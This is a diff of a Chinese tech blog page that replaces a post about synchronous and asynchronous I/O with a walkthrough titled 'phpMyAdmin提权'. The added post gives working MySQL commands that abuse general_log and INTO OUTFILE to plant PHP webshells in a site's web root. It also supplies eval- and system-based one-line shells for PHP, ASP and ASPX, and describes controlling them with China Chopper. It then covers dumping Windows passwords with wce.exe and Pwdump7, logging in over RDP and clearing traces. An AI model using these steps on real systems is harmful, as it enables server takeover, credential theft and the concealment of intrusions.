@@ -7,19 +7,16 @@
 
     
 
-    <title>同步与异步I/O | 月尚の博客</title>
+    <title>phpMyAdmin提权 | 月尚の博客</title>
     
     
-    <meta name="description" content="同步与异步I/O
-同步I/O操作(synchronous I/O operation)：导致请求进程阻塞，直到I/O操作完成。
-异步I/O操作(asynchronous I/O operation): 不导致请求进程阻塞。
-
-同步阻塞IO：设备IO忙时，内核对发起IO请求的进程说：“现在设备忙，你别">
+    <meta name="description" content="检测插入条件假设已知网站默认的路径是D:\phpstudy\WWW，如果要插入一句话后门文件或者是导出shell。必须满足一个前提条件 secure_file_priv 对应的值不能为空且必须为默认网站的路径，检测一下 secure_file_priv 的值。
+phpMyadmin执行以下命令：1S">
     
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="同步与异步I/O"/>
+    <meta property="og:title" content="phpMyAdmin提权"/>
     <meta property="og:site_name" content="月尚の技术小屋"/>
 
     
@@ -252,7 +249,7 @@
             
     
     
-    <a class="breadcrumb" href="/categories/未分类/">未分类</a>
+    <a class="breadcrumb" href="/categories/网络安全/">网络安全</a>
 
 
         
@@ -269,12 +266,12 @@
             <div class="article-title">
                 
     
-        <h1>同步与异步I/O</h1>
+        <h1>phpMyAdmin提权</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2018-09-10T16:00:00.000Z"><a href="/2018/09/11/同步与异步IO/">2018-09-11</a></time>
+            <time class="pink-link-context" datetime="2018-07-15T16:00:00.000Z"><a href="/2018/07/16/phpMyAdmin提权/">2018-07-16</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -284,45 +281,80 @@
             
     <div class="tags-row">
         
-            <a href="/tags/标签/" class="chip pink lighten-1">标签</a>
+            <a href="/tags/phpMyAdmin/" class="chip pink lighten-1">phpMyAdmin</a>
         
     </div>
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#同步与异步I-O"><span class="section table-of-contents-text">同步与异步I/O</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#同步阻塞IO："><span class="section table-of-contents-text">同步阻塞IO：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#同步非阻塞IO："><span class="section table-of-contents-text">同步非阻塞IO：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#异步阻塞IO："><span class="section table-of-contents-text">异步阻塞IO：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#异步非阻塞IO："><span class="section table-of-contents-text">异步非阻塞IO：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#总结："><span class="section table-of-contents-text">总结：</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#举例"><span class="section table-of-contents-text">举例</span></a></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#检测插入条件"><span class="section table-of-contents-text">检测插入条件</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#一句话木马"><span class="section table-of-contents-text">一句话木马</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#提权"><span class="section table-of-contents-text">提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#扩展"><span class="section table-of-contents-text">扩展</span></a></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <h2 id="同步与异步I-O"><a href="#同步与异步I-O" class="headerlink" title="同步与异步I/O"></a>同步与异步I/O</h2><ul>
-<li>同步I/O操作(synchronous I/O operation)：导致请求进程阻塞，直到I/O操作完成。</li>
-<li>异步I/O操作(asynchronous I/O operation): 不导致请求进程阻塞。</li>
+                <h2 id="检测插入条件"><a href="#检测插入条件" class="headerlink" title="检测插入条件"></a>检测插入条件</h2><p>假设已知网站默认的路径是<code>D:\phpstudy\WWW</code>，如果要插入一句话后门文件或者是导出shell。必须满足一个前提条件 <code>secure_file_priv</code> 对应的值不能为空且必须为默认网站的路径，检测一下 <code>secure_file_priv</code> 的值。</p>
+<p>phpMyadmin执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE “secure_file_priv”;</span><br></pre></td></tr></table></figure></p>
+<p>检测的是MySQL全局变量（general_log、general_log file）的值。</p>
+<ul>
+<li><code>general log</code> 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
+<li><code>general log file</code> 指的是日志的保存路径。</li>
 </ul>
-<h3 id="同步阻塞IO："><a href="#同步阻塞IO：" class="headerlink" title="同步阻塞IO："></a>同步阻塞IO：</h3><p>设备IO忙时，内核对发起IO请求的进程说：“现在设备忙，你别走开，在这里等吧，你看IO什么时候做完，做完了你把数据拿走就是了”<br>发起IO请求的进程说：“好，那我在这等你” </p>
-<h3 id="同步非阻塞IO："><a href="#同步非阻塞IO：" class="headerlink" title="同步非阻塞IO："></a>同步非阻塞IO：</h3><p>设备IO忙时，内核对发起IO请求的进程说：“我已经知道你要IO了，但设备现在有点忙，你回家吧，我会记住你这个事的，我有记录呢，只要设备一空闲我就给你做IO的，做完了给你打电话让你过来拿数据”<br>发起IO请求的进程说：“IO还没做完呢，我不走，我要不断的问我的IO什么时候完成，知道你把我的IO做完为止” </p>
-<h3 id="异步阻塞IO："><a href="#异步阻塞IO：" class="headerlink" title="异步阻塞IO："></a>异步阻塞IO：</h3><p>设备IO忙时，内核对发起IO请求的进程说：“现在设备忙，你别走开，在这里等吧，你看IO什么时候做完，做完了你把数据拿走就是了”<br>发起IO请求的进程说：“哦，您忙吧，我在这里排队等着呢，不过我排队时也无聊，就做做其他的事情吧，我会时不时就看看我的IO做完没有的” </p>
-<h3 id="异步非阻塞IO："><a href="#异步非阻塞IO：" class="headerlink" title="异步非阻塞IO："></a>异步非阻塞IO：</h3><p>设备IO忙时，内核对发起IO请求的进程说：“我已经知道你要IO了，但设备现在有点忙，你回家吧，我会记住你这个事的，我有记录呢，只要设备一空闲我就给你做IO的，做完了给你打电话让你过来拿数据”<br>发起IO请求的进程说：“好吧，您看我事也挺多的，既然现在IO一时半会也完成不了，那我先回家去做做其他的事吧，谢谢啊” </p>
-<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>阻塞/非阻塞是内核级的，同步/异步是进程级的，同步非阻塞和异步阻塞一般不会采用，异步非阻塞一般效率比较高，他能够把cpu和io并行处理，当然，如果没有cpu和io并行的这种情况，那就用同步阻塞比较好，这样编程比较简单，且不用多次在内核空间和用户空间进行切换。</p>
-<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>小乐爱喝茶，废话不说，煮开水。<br>出场人物：小乐，水壶两把（普通水壶，简称水壶；会响的水壶，简称响水壶）。<br>   1 小乐把水壶放到火上，立等水开。（<strong>同步阻塞</strong>）<br>     ——   小乐觉得自己有点傻<br>   2 小乐把水壶放到火上，去客厅看电视，时不时去厨房看看水开没有。（<strong>同步非阻塞</strong>）<br>     ——  小乐还是觉得自己有点傻，于是变高端了，买了把会响笛的那种水壶。水开之后，能大声发出呜呜~~~~的噪音。<br>   3 小乐把响水壶放到火上，立等水开。（<strong>异步阻塞</strong>）<br>     ——  小乐觉得这样傻等意义不大<br>   4 小乐把响水壶放到火上，去客厅看电视，水壶响之前不再去看它了，响了再去拿壶。（<strong>异步非阻塞</strong>）<br>     ——  小乐觉得自己聪明了。</p>
-<p>所谓同步异步，只是对于水壶而言。<br>普通水壶，同步；响水壶，异步。<br>虽然都能干活，但响水壶可以在自己完工之后，提示小乐水开了。这是普通水壶所不能及的。<br>同步只能让调用者去轮询自己（情况2中），造成小乐效率的低下。</p>
-<p>所谓阻塞非阻塞，仅仅对于小乐而言。<br>—— 立等的小乐，阻塞；看电视的小乐，非阻塞。</p>
-<p>情况1和情况3中小乐就是阻塞的，媳妇喊他都不知道。</p>
-<p>虽然3中响水壶是异步的，可对于立等的小乐没有太大的意义。</p>
-<p>所以一般异步是配合非阻塞使用的，这样才能发挥异步的效用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;general%&quot;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>Variable_name</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>general_log</td>
+<td>OFF</td>
+<td></td>
+</tr>
+<tr>
+<td>general_log_file</td>
+<td>D:\phpStudy\MySQL\data\Windows10-PC.log</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>从图得知<code>general_log</code>默认是关闭的，log日志存放的位置是<code>D:\phpStudy\MySQL\data\</code></p>
+<p>首先我们来理解一下开启<code>general_log</code>的作用，开启它可以记录用户输入的每条命令，会把其保存在<code>D:\phpStudy\MySQL\data\</code>下的一个log文件中，其实就是常说的日志文件。好，我们的利用的思路是开启<code>general_log</code>之后把<code>general_log_file</code>的值修改为网站默认路径下一个自定义的php文件中，然后通过log日志进行写入一句话后门到上面去，然后再进一步利用。</p>
+<p>具体命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">SET global general_log_file=&apos;D:/phpStudy/WWW/infos.php&apos;;</span><br><span class="line">-- 注意斜杠！</span><br></pre></td></tr></table></figure></p>
+<p>网站根路径下找到我们生成的伪日记文件<code>infos.php</code></p>
+<p>然后我们就得插入我们的一句话后门了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ‘&lt;?php eval($_POST[muma]);?&gt;’;</span><br></pre></td></tr></table></figure></p>
+<p><code>$_POST[&#39;muma&#39;])</code> 是获取post变量，这里指获取<code>muma</code>这个变量，<br>而<code>eval</code>是一个php函数，可以将字符串中的符合php语法的字符当做php代码进行执行。<br>假如在表单域中写上：<code>unlink(&#39;index.php&#39;)</code>，并将其作为<code>muma</code>变量发送给这个文件，就会执行<code>unlink(&#39;index.php&#39;)</code>，即删除<code>index.php</code>文件。</p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>asp的一句话是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% eval request(&quot;pass&quot;) %&gt;</span><br></pre></td></tr></table></figure></p>
+<p>aspx的一句话是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;); %&gt;</span><br></pre></td></tr></table></figure></p>
+<p>php的一句话是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&apos;pass&apos;]); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这几个一句话的密码都是pass，也就是双引号或者单引号包含着的这部分。</p>
+<p>在菜刀主界面，右击，选择“添加”，<br>在“地址”这里填上你插入一句话的文件的地址，后边的那个小框填的是你的一句话的密码，其他的不用填， 填完之后单击“添加”，就可以了。<br>添加完毕后，你的这个一句话的shell会显示到主界面里，右击它，选择“文件管理”，就可以看到网站上的文件了<br>在菜刀里还有一个功能，是“虚拟终端”，也是在右键菜单里的，这个相当于webshell中的执行DOS命令的功能<br>如果你的shell有权执行DOS命令，那么直接输入命令回车就可以看到结果了。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获取密码</p>
+<p>上传wce.exe获取明文密码。如果不能直接获取明文那就得走第二条获取hash值然后解密。</p>
+<p>获取hash值</p>
+<p>上传Pwdump7.exe获取hash值保存到password.txt文件中。获取hash值可以选择在线 <a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a> 跑，跑不出来就用Ophcrack导入彩虹表跑吧。</p>
+<p>查看3389是否开启</p>
+<p>直接在菜刀终端输入<code>netstat -an | find “3389</code> 或者<code>netstat -an</code>。</p>
+<p>运行mstsc开启远程桌面，输入上面获取到的账号和密码登陆。</p>
+<p>最后，记得清除痕迹。</p>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>上面演示了<code>secure_file_priv</code>值为空的情况，那么如果<code>secure_file_priv</code>不为空该怎么办？</p>
+<p>一句话还可以这样插入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`informationes` (`inform` TEXT NOT NULL);</span><br><span class="line">INSERT INTO `mysql`.`informationes` (`inform`) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);</span><br><span class="line">SELECT `inform` from `mysql`.`informationes` into outfile &apos;e:/phpStudy/WWW/infos.php&apos;;</span><br><span class="line">DROP table if exists `mysql`.`informationes`;</span><br><span class="line">（注意： D:/phpStudy/WWW/为网站的绝对路径）</span><br></pre></td></tr></table></figure></p>
+<p>导出具有命令权限的Shell的php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ‘&lt;?php echo \’&lt;pre&gt;\’;system($_POST[\&apos;muma\&apos;]);echo \’&lt;/pre&gt;\’;?&gt;’ into outfile ‘D:/phpStudy/WWW/test.php’;</span><br></pre></td></tr></table></figure></p>
 
                 
 <p class="pink-link-context">
-    <a href="/2018/09/11/协程/" rel="next" title="协程">
-    上一篇：协程
+    <a href="/2018/09/11/同步与异步IO/" rel="next" title="同步与异步I/O">
+    上一篇：同步与异步I/O
   </a>
 </p>
 
 
 
 <p class="pink-link-context">
-    <a href="/2018/07/16/phpMyAdmin提权/" rel="next" title="phpMyAdmin提权">
-    下一篇：phpMyAdmin提权
+    <a href="/2017/08/24/计算机编码（一）/" rel="next" title="计算机编码（一）">
+    下一篇：计算机编码（一）
   </a>
 </p>
 
